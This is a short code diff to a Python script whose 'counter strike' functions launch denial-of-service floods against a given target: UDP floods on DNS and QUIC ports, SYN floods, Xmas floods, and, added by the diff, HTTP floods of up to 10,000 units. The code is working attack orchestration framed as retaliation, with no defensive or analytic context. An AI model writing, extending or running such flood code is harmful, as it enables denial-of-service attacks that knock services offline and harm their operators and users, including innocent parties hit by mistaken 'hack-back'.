@@ -1,5 +1,6 @@
 import counter_strike_helper
 def full_scale_counter_strike(target):
+    counter_strike_helper.attack_http_flood(target,80,10000)
     counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
     counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
     counter_strike_helper.synflood(target,80,200) # HTTP
@@ -15,6 +16,7 @@ def full_scale_counter_strike(target):
         counter_strike_helper.xmasflood(target,port,50)
 
 def fast_counter_strike(target):
+    counter_strike_helper.attack_http_flood(target, 80, 3000)
     counter_strike_helper.attack_UDP("UDP-Mix", target, 53, 60)  # DNS
     counter_strike_helper.synflood(target, 80, 100)  # HTTP
     counter_strike_helper.synflood(target, 443, 100)  # HTTPS
